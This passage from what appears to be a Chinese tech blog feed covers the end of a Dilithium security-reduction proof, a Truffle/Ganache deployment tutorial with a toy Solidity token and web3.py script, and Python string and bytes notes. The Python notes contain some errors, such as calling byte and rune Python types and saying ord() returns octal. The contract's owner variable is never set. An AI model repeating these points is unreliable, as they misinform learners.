\mathcal{A}$ 能够在选定消息攻击（CMA）模型下伪造签名，则：他能够有效找到一个 $y &#x3D; [z’, c’, u’]$，满足 SelfTargetMSIS 问题的定义。那么他就能够破解 SelfTargetMSIS 问题。这与 SelfTargetMSIS 的困难性假设矛盾。</li></ol><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>新消息伪造的安全性规约到 SelfTargetMSIS 的困难性。</p><hr><h2 id="3-强不可伪造性（SUF-CMA）的形式化安全分析"><a href="#3-强不可伪造性（SUF-CMA）的形式化安全分析" class="headerlink" title="3. 强不可伪造性（SUF-CMA）的形式化安全分析"></a><strong>3. 强不可伪造性（SUF-CMA）的形式化安全分析</strong></h2><h3 id="安全目标-2"><a href="#安全目标-2" class="headerlink" title="安全目标"></a><strong>安全目标</strong></h3><p>攻击者不能在选定消息攻击（CMA）模型下伪造任何签名消息$M$的有效签名$\sigma’$。</p><h3 id="攻击模型-2"><a href="#攻击模型-2" class="headerlink" title="攻击模型"></a><strong>攻击模型</strong></h3><p>基于上面新消息伪造的证明，只用证明：无法基于$\sigma$构造出新的有效签名$\sigma’$</p><ul><li>攻击者$ \mathcal{A} $被赋予如下能力：<ol><li>查询公钥接口</li><li>查询签名接口，获得$\sigma &#x3D; (z, h, c)$</li><li><strong>伪造目标</strong> ：<ol><li>输出一个消息$ M $和有效签名 $\sigma’ &#x3D; (z’, h’, c)$</li><li>消息$ M $的签名$\sigma’$之前没有被查询过，即使是查询过消息$ M $的签名，只要构造的有效签名$\sigma’$并不是查询到的而是构造出来的</li></ol></li></ol></li></ul><h3 id="安全性定义-2"><a href="#安全性定义-2" class="headerlink" title="安全性定义"></a><strong>安全性定义</strong></h3><ol><li>CRYSTALS-Dilithium 的强不可伪造性规约到 <strong>模块化短整数解问题（MSIS）</strong>。</li><li>**MSIS 问题：**给定矩阵 $\mathbf{A}$，找到非零短向量$y$，满足：$[I | \mathbf{A}] \cdot y &#x3D; 0$，且$ |y|_\infty \leq \gamma$</li></ol><h3 id="形式化证明-2"><a href="#形式化证明-2" class="headerlink" title="形式化证明"></a><strong>形式化证明</strong></h3><ol><li><p><strong>挑战设置：</strong><br>挑战者$\mathcal{C} $初始化：</p><ul><li>系统参数 $\mathbf{A}$、签名公式 $\sigma &#x3D; (z, h, c)$</li></ul></li><li><p><strong>攻击者能力：</strong><br>$\mathcal{A}$能够查询公钥和签名并且能只改变签名中的$(z,h)$，并尝试找到 $\sigma \neq \sigma’$，满足：</p><p>$H(\mu|UseHint_q(h’, \mathbf{A}z’ - ct_1 \cdot 2^d, 2\gamma_2))&#x3D;H(\mu|UseHint(h, \mathbf{A}z - ct_1 \cdot 2^d, 2\gamma_2))&#x3D;c$</p></li><li><p><strong>规约到 MSIS：</strong></p><ol><li>如果 $\mathcal{A}$成功伪造出签名$\sigma’$签名，则$UseHint_q(h, \mathbf{A}z - ct_1 \cdot 2^d, 2\gamma_2) &#x3D; UseHint_q(h’, \mathbf{A}z’ - ct_1 \cdot 2^d, 2\gamma_2)$</li><li>所以$\frac{1}{2\gamma_2}\cdot(\mathbf{A}z-ct_1 \cdot 2^d + u)&#x3D;\frac{1}{2\gamma_2}\cdot(\mathbf{A}z’-ct_1 \cdot 2^d + u)$，两式相减得到：$ \mathbf{A} \cdot (z - z’) + u &#x3D; 0$, 令 $y &#x3D; \left[\begin{array}{c}z-z’\u\end{array}\right]$，则可以变形为$[I | \mathbf{A}] \cdot y &#x3D; 0$，其中$y$是一个短向量，满足 MSIS 的定义。</li></ol></li><li><p><strong>归谬证明：</strong><br>如果$ \mathcal{A} $能够生成有效签名$\sigma’$，则能够通过这个算法找到有效的短向量$y$，满足 MSIS 问题定义。那么他就能够破解 MSIS 问题。这与MSIS 的困难性假设矛盾。</p></li></ol><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>强不可伪造性的安全性规约到 MSIS 的困难性。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>CRYSTALS-Dilithium 的安全性分析如下：</p><ol><li><strong>密钥恢复</strong>规约到 <strong>MLWE</strong>；</li><li><strong>新消息伪造</strong>规约到 <strong>SelfTargetMSIS</strong>；</li><li><strong>强不可伪造性</strong>规约到 <strong>MSIS</strong>。</li></ol><p>最终安全界限为：</p><p>$Adv_{SUF-CMA} \leq Adv_{MLWE} + Adv_{SelfTargetMSIS} + Adv_{MSIS} + \text{negligible terms}$</p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> post-quantum </tag>
            
            <tag> digital signatur </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>truffle部署</title>
      <link href="/2025/03/01/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
      <url>/2025/03/01/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="truffle-init"><a href="#truffle-init" class="headerlink" title="truffle init"></a>truffle init</h1><ol><li><p>初始化项目</p></li><li><p>修改生成的truffle-config.js文件，使之和环境匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  networks: &#123;</span><br><span class="line">    // Ganache 本地开发网络配置</span><br><span class="line">    development: &#123;</span><br><span class="line">      host: &quot;127.0.0.1&quot;,     // Ganache 本地主机地址</span><br><span class="line">      port: 7545,            // Ganache 默认端口</span><br><span class="line">      network_id: &quot;*&quot;,       // 匹配任意网络 ID</span><br><span class="line">      gas: 1000000,         // Gas 限制，确保足够</span><br><span class="line">      gasPrice: 20000000000, // Gas 价格，设置为 20 gwei</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // Mocha 配置</span><br><span class="line">  mocha: &#123;</span><br><span class="line">    timeout: 100000, // 单位为毫秒，避免测试超时</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // Solidity 编译器配置</span><br><span class="line">  compilers: &#123;</span><br><span class="line">    solc: &#123;</span><br><span class="line">      version: &quot;0.8.21&quot;,    // 与合约所用的 Solidity 版本一致</span><br><span class="line">      settings: &#123;</span><br><span class="line">        optimizer: &#123;</span><br><span class="line">          enabled: true,   // 开启优化器</span><br><span class="line">          runs: 200,       // 优化运行次数</span><br><span class="line">        &#125;,</span><br><span class="line">        evmVersion: &quot;istanbul&quot;, // 与 Ganache 默认兼容的 EVM 版本</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // 数据库设置（可选）</span><br><span class="line">  db: &#123;</span><br><span class="line">    enabled: false, // 禁用 Truffle DB</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h1 id="truffle-compile"><a href="#truffle-compile" class="headerlink" title="truffle compile"></a>truffle compile</h1><p>编译contracts中的智能合约文件</p><h1 id="truffle-migrate"><a href="#truffle-migrate" class="headerlink" title="truffle migrate"></a>truffle migrate</h1><p>运行migrations中的js迁移脚本，将智能合约迁移到区块链上</p><h2 id="迁移脚本"><a href="#迁移脚本" class="headerlink" title="迁移脚本"></a>迁移脚本</h2><h3 id="artifacts-require"><a href="#artifacts-require" class="headerlink" title="artifacts.require()"></a>artifacts.require()</h3><p>在迁移开始时，我们通过 <code>artifacts.require（）</code>方法告诉 Truffle 我们想要与哪些合约进行交互。 这个方法类似于Node的<code>require</code>，但在我们的例子中，它特别返回了一个合约抽象contract abstraction，我们可以在其余的部署脚本中使用它。 指定的名称应与该源文件中的<strong>合约定义的名称</strong>相匹配。 不传递源文件的文件名，因为文件可以包含多个合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">solidity智能合约:</span><br><span class="line">contract Coin &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">js迁移脚本:</span><br><span class="line">const Coin = artifacts.require(&quot;Coin&quot;);</span><br></pre></td></tr></table></figure><h3 id="deployer-deploy-contract-args…-options"><a href="#deployer-deploy-contract-args…-options" class="headerlink" title="deployer.deploy(contract, args…, options)"></a>deployer.deploy(contract, args…, options)</h3><p>部署合约可以通过使用指定<code>合约对象</code>和<code>可选的合约构造函数的参数</code>来进行合约部署。对于单个合约很有用，DApp只存在此合约的一个实例。 它将在部署之后设置合约地址（即<code>Contract.address</code> 将等于新部署的地址），并且它将覆盖任何先前存储的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 部署没有构造函数的合约</span><br><span class="line">deployer.deploy(A);</span><br><span class="line"></span><br><span class="line">//  部署合约 并使用一些参数传递给合约的构造函数。</span><br><span class="line">deployer.deploy(A, arg1, arg2, ...);</span><br><span class="line"></span><br><span class="line">// 如果合约部署过，不会覆盖</span><br><span class="line">deployer.deploy(A, &#123;overwrite: false&#125;);</span><br><span class="line"></span><br><span class="line">// 设置gasLimit 和部署合约的账号</span><br><span class="line">deployer.deploy(A, &#123;gas: 4612388, from: &quot;0x....&quot;&#125;);</span><br><span class="line"></span><br><span class="line">// 部署多个合约，一些包含参数，另一些没有。</span><br><span class="line">// 这比编写三个`deployer.deploy（）`语句更快，因为部署者可以作为单个批处理请求执行部署。</span><br><span class="line">deployer.deploy([</span><br><span class="line">  [A, arg1, arg2, ...],</span><br><span class="line">  B,</span><br><span class="line">  [C, arg1]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">// 外部依赖示例:</span><br><span class="line">//对于此示例，我们的依赖在部署到线上网络时提供了一个地址，但是没有为测试和开发等任何其他网络提供地址。</span><br><span class="line">//当我们部署到线上网络时，我们希望它使用该地址，但在测试和开发中，我们需要部署自己的版本。 我们可以简单地使用`overwrite`键来代替编写一堆条件。</span><br><span class="line"></span><br><span class="line">deployer.deploy(SomeDependency, &#123;overwrite: false&#125;);</span><br></pre></td></tr></table></figure><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Coin&#123;</span><br><span class="line">    address hoster;</span><br><span class="line">    mapping(address=&gt;uint) private balances; //防止非法访问</span><br><span class="line">    event Deal(address from, address to, uint amount);</span><br><span class="line">    event Send(address to, uint amount);</span><br><span class="line">    </span><br><span class="line">    constructor(uint initialsuppuly) &#123;</span><br><span class="line">        balances[msg.sender] = initialsuppuly;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deal(address receiver, uint account) public&#123;</span><br><span class="line">        require(balances[msg.sender]&gt;=account &amp;&amp; balances[receiver] + account &lt;= type(uint).max); //防止溢出</span><br><span class="line">        balances[receiver] += account;</span><br><span class="line">        balances[msg.sender] -= account;</span><br><span class="line">        emit Deal(msg.sender, receiver, account);  </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    function get(address site) public view returns(uint)&#123;</span><br><span class="line">        require((msg.sender == hoster) || (site == msg.sender));</span><br><span class="line">        return balances[site];</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迁移脚本-1"><a href="#迁移脚本-1" class="headerlink" title="迁移脚本"></a>迁移脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// migrations/2_coin_migration.js</span><br><span class="line">const Coin = artifacts.require(&quot;Coin&quot;);</span><br><span class="line"></span><br><span class="line">module.exports = function(deployer) &#123;</span><br><span class="line">  // 设置初始供应量，例如 1000 个代币</span><br><span class="line">  const initialSupply = 500;</span><br><span class="line"></span><br><span class="line">  // 部署 Coin 合约，并传递初始供应量作为构造函数参数</span><br><span class="line">  deployer.deploy(Coin, initialSupply);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="调用的python脚本"><a href="#调用的python脚本" class="headerlink" title="调用的python脚本"></a>调用的python脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># app.py</span><br><span class="line">import json</span><br><span class="line">from web3 import Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line"># Truffle 开发区块链地址</span><br><span class="line">blockchain_address = &#x27;http://127.0.0.1:7545&#x27;</span><br><span class="line"># 创建与区块链交互的客户端实例</span><br><span class="line">web3 = Web3(HTTPProvider(blockchain_address))</span><br><span class="line"># 获取所有可用账户</span><br><span class="line">accounts = web3.eth.accounts</span><br><span class="line">print(accounts)</span><br><span class="line"></span><br><span class="line"># 编译后的合约 JSON 文件路径</span><br><span class="line">compiled_contract_path = &#x27;build/contracts/Coin.json&#x27;</span><br><span class="line"># 部署的合约地址（见 `migrate` 命令输出中的 `contract address`）</span><br><span class="line">deployed_contract_address = &#x27;0x0686A0ccaBF9AFd900C01946d118e8D8343c3c30&#x27;</span><br><span class="line"></span><br><span class="line"># 打开编译后的合约 JSON 文件</span><br><span class="line">with open(compiled_contract_path, encoding=&quot;utf-8&quot;) as file:</span><br><span class="line">    contract_json = json.load(file)  # 加载合约信息为 JSON</span><br><span class="line">    contract_abi = contract_json[&#x27;abi&#x27;]  # 获取合约的 ABI - 调用其函数时必需</span><br><span class="line"></span><br><span class="line"># 获取已部署合约的引用</span><br><span class="line">contract = web3.eth.contract(address=deployed_contract_address, abi=contract_abi)</span><br><span class="line"></span><br><span class="line">#  调用合约函数（这不会持久化到区块链）</span><br><span class="line">#  获取合约部署者的余额</span><br><span class="line">web3.eth.defaultAccount = accounts[1]</span><br><span class="line">balance = contract.functions.get(accounts[1]).call()</span><br><span class="line"></span><br><span class="line"># 打印返回的消息</span><br><span class="line">print(balance)</span><br><span class="line"></span><br><span class="line">receiver_address = accounts[1]  # 接收者地址</span><br><span class="line">amount = 100  # 转账金额</span><br><span class="line"></span><br><span class="line">contract.functions.deal(receiver_address, amount).transact(&#123;&#x27;from&#x27;: accounts[0]&#125;)</span><br><span class="line"></span><br><span class="line">web3.eth.defaultAccount = accounts[1]</span><br><span class="line">balance = contract.functions.get(accounts[1]).call()</span><br><span class="line"></span><br><span class="line"># 打印返回的消息</span><br><span class="line">print(balance)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本地部署 </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2025/03/01/python/"/>
      <url>/2025/03/01/python/</url>
      
        <content type="html"><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><ol><li><code>title()</code>—首字母大写 ；<code>upper()</code>—–全大写 ；<code>lower()</code>—–全小写 。用法：<code>变量名.title()</code> ;<code>变量名.upper()</code> ; <code>变量名.lower()</code>.这些都是临时操作，无法改变变量的值，只有：<code>变量=变量名.··()</code>才行。</li><li><code>f&quot;&quot;</code>可以将变量插入字符串中，则直接是双引号里的内容(空格要算)；若在””里加{}，再在{}里加变量名，则可以将字符串变量的内容插入“”内的字符串里。f””可以直接在print里面使用。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">m=f&quot;jdka jsk&quot;</span><br><span class="line">//输出：jdka jsk </span><br><span class="line"></span><br><span class="line">m=&quot;jsakdf&quot; </span><br><span class="line">n=f&quot;jksa &#123;m&#125; ajdkf&quot;</span><br><span class="line">输出n：jksa jsakdf ajdkf。</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><code>\t</code>(制表符)在开头添加空白，如 print(“\tksfj”)。<code>\n</code>换行，<code>\t</code>,<code>\n</code>可以添加在字符串中的任意位置</li><li>删除空白  <code>rstrip()</code>—删除右空白, <code>lstrip()</code>—删除左空白, <code>strip()</code>—删除空白（左右的，中间的不能删）。用法 <code>变量名.rstrip()</code>；<code>变量名.lstrip()</code>；<code>变量名.strip()</code></li><li>字符串可以直接相加。python中单引号和双引号没有区别。包括换行的字串用”””……”””</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">s = &quot;&quot;&quot;</span><br><span class="line">dsfsfdsf</span><br><span class="line">fsfsfsd</span><br><span class="line">dffd</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><ol start="6"><li>可以在已有的字符串中引用其中单个字符，但不能给超出字符串长度的位置进行单个赋值。引用方法：字符串a[位置s]</li><li>换行时：print()</li><li><code>chr()</code>函数可以将一个整数转换成其对应的字符（ASCII值）</li><li><code>ord()</code>函数它可以对应一个长度为1的字符返回相对应的Unicode值或者8进制的ASCII值。严密意思上说，它是与chr函数完全相反计算的函数。（只能是长度为一的字符）</li><li><code>str()</code>函数可以将<strong>数字</strong>直接转化为字符串：1-&gt;’1’。</li><li>byte字符串是uint8的别称，rune字符串是int32的别称。byte类型和rune类型使用编码方式不同，其中byte是ASCII编码字符，rune是utf-8字符。</li><li>ascii有效数值33-126</li><li>replace函数，替换字符串中的字符：replace(要替换内容，被替换的内容)，还可以是replace(要替换内容，被替换的内容,替换个数(从第一个开始))</li><li><code>a = string.printable[:62]</code> 生成只含且包含所有并且不重复的数字和大小写字母的字符串，<code>string.printable[:-6] </code>打印所有可见字符无法打印ascii表的所有字符，有些可以用字节串表示的字符不在其中</li><li><code>for i in itertools.product(a,repeat=4):  </code>遍历由a字符串中所含的字符构成所有可能的长度为4的字符串,此时i是元组的形式，每个元素是一个字符。(需要这个函数<code>itertools</code>)。<code>itertools.permutations</code>和<code>product</code>类似，用法也类似。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = &#x27;abc&#x27;</span><br><span class="line">for i in itertools.product(a,repeat=3):</span><br><span class="line">    print(i,end=&#x27; &#x27;)</span><br><span class="line">//(&#x27;a&#x27;, &#x27;a&#x27;, &#x27;a&#x27;) (&#x27;a&#x27;, &#x27;a&#x27;, &#x27;b&#x27;) (&#x27;a&#x27;, &#x27;a&#x27;, &#x27;c&#x27;) (&#x27;a&#x27;, &#x27;b&#x27;, &#x27;a&#x27;) (&#x27;a&#x27;, &#x27;b&#x27;, &#x27;b&#x27;) (&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;) (&#x27;a&#x27;, &#x27;c&#x27;, &#x27;a&#x27;) (&#x27;a&#x27;, &#x27;c&#x27;, &#x27;b&#x27;) (&#x27;a&#x27;, &#x27;c&#x27;, &#x27;c&#x27;) (&#x27;b&#x27;, &#x27;a&#x27;, &#x27;a&#x27;) (&#x27;b&#x27;, &#x27;a&#x27;, &#x27;b&#x27;) (&#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;) (&#x27;b&#x27;, &#x27;b&#x27;, &#x27;a&#x27;) (&#x27;b&#x27;, &#x27;b&#x27;, &#x27;b&#x27;) (&#x27;b&#x27;, &#x27;b&#x27;, &#x27;c&#x27;) (&#x27;b&#x27;, &#x27;c&#x27;, &#x27;a&#x27;) (&#x27;b&#x27;, &#x27;c&#x27;, &#x27;b&#x27;) (&#x27;b&#x27;, &#x27;c&#x27;, &#x27;c&#x27;) (&#x27;c&#x27;, &#x27;a&#x27;, &#x27;a&#x27;) (&#x27;c&#x27;, &#x27;a&#x27;, &#x27;b&#x27;) (&#x27;c&#x27;, &#x27;a&#x27;, &#x27;c&#x27;) (&#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;) (&#x27;c&#x27;, &#x27;b&#x27;, &#x27;b&#x27;) (&#x27;c&#x27;, &#x27;b&#x27;, &#x27;c&#x27;) (&#x27;c&#x27;, &#x27;c&#x27;, &#x27;a&#x27;) (&#x27;c&#x27;, &#x27;c&#x27;, &#x27;b&#x27;) (&#x27;c&#x27;, &#x27;c&#x27;, &#x27;c&#x27;) </span><br><span class="line"></span><br><span class="line">for i in itertools.permutations(&#x27;abc&#x27;): </span><br><span class="line">  print(i,end=&#x27; &#x27;)</span><br><span class="line">//(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;) (&#x27;a&#x27;, &#x27;c&#x27;, &#x27;b&#x27;) (&#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;) (&#x27;b&#x27;, &#x27;c&#x27;, &#x27;a&#x27;) (&#x27;c&#x27;, &#x27;a&#x27;, &#x27;b&#x27;) (&#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;) </span><br></pre></td></tr></table></figure><ol start="16"><li>i &#x3D;””.join(i)，将列表i中的所有元素合并为一个字符串。</li><li>set():set函数用于创建一个无序不重复元素集(可以去掉重复的字母)，它的输出结果是一个set类型。set函数可以接收任何可迭代对象作为参数，包括列表、元组、字符串、字典等。当你使用set函数从字典创建集合时，它只会保留字典中的键，而不会保留值。</li></ol><h1 id="字节串"><a href="#字节串" class="headerlink" title="字节串"></a>字节串</h1><ol><li>提取字节串的任意一个不可打印字符：<ol><li>直接通过该字符的索引提取时，提取得到的是该字符的ASCII值</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = b&#x27;\x01helloww&#x27;</span><br><span class="line">print(a[0])</span><br><span class="line"></span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><pre><code>  2. for循环提取字节时，同样是提取该字节对应的ASCII码</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = b&quot;01&quot;</span><br><span class="line">for i in s:</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td></tr></table></figure><pre><code>  3. 通过切片提取（及切片长度为1），提取的是该字符的字节串</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = b&#x27;\x01helloww&#x27;</span><br><span class="line">print(a[0:1])</span><br><span class="line"></span><br><span class="line">输出：b&#x27;\x01&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>字节转比特流时（即二进制表示），一个字节对应8比特，每个字节的改变只会影响该字节对应的8个比特，不会影响其他位二进制数据（即其他字节对应的二进制位）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import bytes_to_long</span><br><span class="line"></span><br><span class="line">a = b&#x27;qas&#x27;</span><br><span class="line">print(bin(bytes_to_long(a)))</span><br><span class="line">a = b&#x27;sad&#x27;</span><br><span class="line">print(bin(bytes_to_long(a)))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">0b1110001 01100001 01110011</span><br><span class="line">0b1110011 01100001 01100100</span><br><span class="line">补齐高位0后：</span><br><span class="line">01110001 01100001 01110011</span><br><span class="line">01110011 01100001 01100100</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>移位操作符<ol><li>左移操作符（&lt;&lt;）将一个数的二进制表示向左移动指定的位数，相当于对该数进行乘以 2^n的操作。</li><li>右移操作符（&gt;&gt;）将一个数的二进制表示向右移动指定的位数，相当于对该数进行除以 2^n 的操作。</li></ol></li><li>在Python中，bytes 对象是不可变的，这意味着你不能直接修改它的内容。当你尝试像修改普通列表或数组那样去修改 bytes 对象时，就会遇到 TypeError: ‘bytes’ object does not support item assignment 这样的错误。<ol><li>为了解决这个问题，你可以使用 bytearray 类型，它是 bytes 的可变版本。你可以将 bytes 对象转换为 bytearray 对象，对其进行修改，然后如果需要，再将其转换回 bytes 对象。</li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 假设 txt 是一个 bytes 对象</span><br><span class="line">txt = b&#x27;\x01\x02\x03\x04&#x27;</span><br><span class="line"></span><br><span class="line"># 将 bytes 对象转换为 bytearray</span><br><span class="line">txt_modifiable = bytearray(txt)</span><br><span class="line"></span><br><span class="line"># 现在你可以修改 txt_modifiable</span><br><span class="line"># 将字符 &#x27;1&#x27; 的 ASCII 值赋给第二个字节</span><br><span class="line">txt_modifiable[1] = ord(&#x27;\x98&#x27;)</span><br><span class="line"></span><br><span class="line"># 如果需要，可以将修改后的 bytearray 转换回 bytes</span><br><span class="line">txt = bytes(txt_modifiable)</span><br><span class="line">print(txt)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">b&#x27;\x01\x98\x03\x04&#x27;</span><br></pre></td></tr></table></figure><h1 id="数和运算"><a href="#数和运算" class="headerlink" 